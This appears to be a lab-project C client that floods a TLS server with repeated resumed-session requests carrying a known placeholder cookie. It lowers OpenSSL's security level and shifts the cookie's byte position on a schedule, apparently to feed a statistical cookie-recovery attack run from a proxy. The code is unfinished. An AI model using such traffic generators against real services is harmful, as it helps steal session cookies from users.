#include <arpa/inet.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/tcp.h>

#define L 2000  //numero di tentativi per ogni byte

SSL_CTX *setup_ssl_context();
int initialize_connection(const char *server_ip, int port);
int do_single_request(const char *server_ip, int port, SSL_CTX *ctx, SSL_SESSION **session); 
void sendRequests(const char *server_ip, int port, SSL_CTX *ctx); // funzione per mandare dati al server
int sendCookie(SSL *ssl);
void right_shift();

char cookie_payload[] = "AAAAAAAAAAAAAAAAAAAAAACOOKIE=cookie_super_segreto567890123456789";
bool first_bytes = true;
int counter = 0;

int main(int argc, char *argv[]) 
{
  // indirizzo del server
  char *server_ip;
  int port;
  char ping_cmd[16];

  if(argc != 3){
    perror("Missing server address argument");
    exit(EXIT_FAILURE);
  }

  server_ip = argv[1];
  port = atoi(argv[2]);

  printf("Ip server: %s\n", server_ip);
  printf("Port: %d\n", port);

  //snprintf(ping_cmd, sizeof(ping_cmd), "ping -c 1 %s", server_ip);
  //system("ip neighbor show");
  //system(ping_cmd);
 
  SSL_CTX *ctx = setup_ssl_context();

  if (ctx == NULL) {
    perror("SSL context initialization error");
    exit(EXIT_FAILURE);
  }

  /*
  char decision;
  printf("Do you want to start the attack (y/n)? ");
  scanf("%c", &decision); */

  sendRequests(server_ip, port, ctx);

  /*
  SSL_shutdown(ssl);
  SSL_free(ssl);
  close(sockfd); */
  SSL_CTX_free(ctx);

  return 0;
}

//functiom to initialize SSL context
SSL_CTX *setup_ssl_context() {
  SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());

  if(!SSL_CTX_load_verify_locations(ctx, "server.crt", NULL)){
    ERR_print_errors_fp(stderr);
    SSL_CTX_free(ctx);
    return NULL;
  }

  SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
  SSL_CTX_set_verify_depth(ctx, 4);
  SSL_CTX_set_security_level(ctx, 0);

  return ctx;
}

//function to initialize the connection TCP (create the channel)
int initialize_connection(const char *server_ip, int port){
  struct sockaddr_in server_addr;

  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  int flag = 1;
  setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, (char *) &flag, sizeof(int));

  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(port);
  if(inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0){
    perror("Invalid address");
    exit(EXIT_FAILURE);
  }

  if(connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0){
    perror("Connection error");
    exit(EXIT_FAILURE);
  }

  return sockfd;
}

//function to send a single request to the server and receive the response 
int do_single_request(const char *server_ip, int port, SSL_CTX *ctx, SSL_SESSION **session){

  int result = -1;
  char buffer[1024];  
  int sockfd = initialize_connection(server_ip, port);
  SSL *ssl = SSL_new(ctx);

  if(ssl == NULL){
    perror("SSL initialization error");
    exit(EXIT_FAILURE);
  }

  //system("ip neighbor show");
  SSL_set_fd(ssl, sockfd);

  if(*session != NULL){
    SSL_set_session(ssl, *session);
  }

  if(SSL_connect(ssl) <= 0){
    perror("SSL connection error");
    ERR_print_errors_fp(stderr);
    SSL_free(ssl);
    exit(EXIT_FAILURE);
  }

  if(*session == NULL){
    *session = SSL_get1_session(ssl);
  }

  SSL_write(ssl, cookie_payload, strlen(cookie_payload));

  ssize_t n = SSL_read(ssl, buffer, sizeof(buffer) - 1);

  if(n > 0){
    result = 1;
    buffer[n] = '\0';
    printf("Server response: %s\n", buffer);
  }else{
    perror("SSL read error");
  }

  SSL_free(ssl);
  close(sockfd);

  return result;
}

//function to send data to the server in a loop, calling do_single_request for each request
void sendRequests(const char *server_ip, int port, SSL_CTX *ctx) {

  SSL *ssl;
  char buffer[1024];
  int i = 0;
  SSL_SESSION *saved_session = NULL;

  //numero totale di richieste 671232
  //dopo L richieste si esegue lo shift del cookie
  while (i < L*(256*256)) {
    printf("Richiesta numero: %d \n", i + 1);
    do_single_request(server_ip, port, ctx, &saved_session);
    i++;
    if(first_bytes && counter == L * 65536){
      right_shift();
      counter = 0;
      first_bytes = false;
    }else if(!first_bytes && counter == L * 256){
      counter = 0;
      right_shift();
    }
    counter++;
  }

  if(saved_session != NULL){
    SSL_SESSION_free(saved_session);
  }
}

//function to shift the cookie payload to the right by one position
void right_shift(){

  int i;

  for(i = strlen(cookie_payload) -1; i > 0; i --){
    if(cookie_payload[i] != '\0'){
      cookie_payload[i] = cookie_payload[i-1];
    }
  }

  cookie_payload[i] = 'A';
}


/**
 * implementare il filling perfetto del cookie all'interno del pacchetto, deve occupare esattamente 42 byte(o il valore che serve)
 * 
 * implementare lo scorrimento del cookie verso destra di una posizione ogni tot esecuzioni. (decidere se gestire in modo automatico lo spostamento o sotto richiesta del proxy)
 * 
 */
